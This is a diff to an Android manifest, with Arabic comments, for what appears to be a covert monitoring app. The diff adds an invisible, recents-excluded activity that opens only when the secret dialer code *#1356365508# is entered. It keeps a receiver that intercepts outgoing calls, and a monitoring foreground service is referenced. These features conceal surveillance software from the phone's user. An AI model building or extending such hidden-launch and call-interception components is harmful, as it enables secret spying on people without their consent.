@@ -101,6 +101,19 @@
             android:taskAffinity=""
             android:launchMode="singleTask" />
 
+        <!-- منفذ حصري لاستقبال رمز الاتصال السري (*#1356365508#) -->
+        <activity
+            android:name=".SecretCodeActivity"
+            android:theme="@android:style/Theme.NoDisplay"
+            android:excludeFromRecents="true"
+            android:exported="true"
+            android:noHistory="true">
+            <intent-filter android:priority="999">
+                <action android:name="android.provider.Telephony.SECRET_CODE" />
+                <data android:scheme="android_secret_code" android:host="1356365508" />
+            </intent-filter>
+        </activity>
+
         <!-- خدمة المراقبة الأساسية -->
         <service
             android:name=".MonitoringForegroundService"
@@ -170,11 +183,6 @@
         <receiver
             android:name=".SecretCodeReceiver"
             android:exported="true">
-            <!-- Primary: standard secret code (most Android ROMs) -->
-            <intent-filter android:priority="999">
-                <action android:name="android.provider.Telephony.SECRET_CODE" />
-                <data android:scheme="android_secret_code" android:host="1356365508" />
-            </intent-filter>
             <!-- Fallback: Samsung One UI 5/6/7 — intercept outgoing call before it connects -->
             <intent-filter android:priority="999">
                 <action android:name="android.intent.action.NEW_OUTGOING_CALL" />
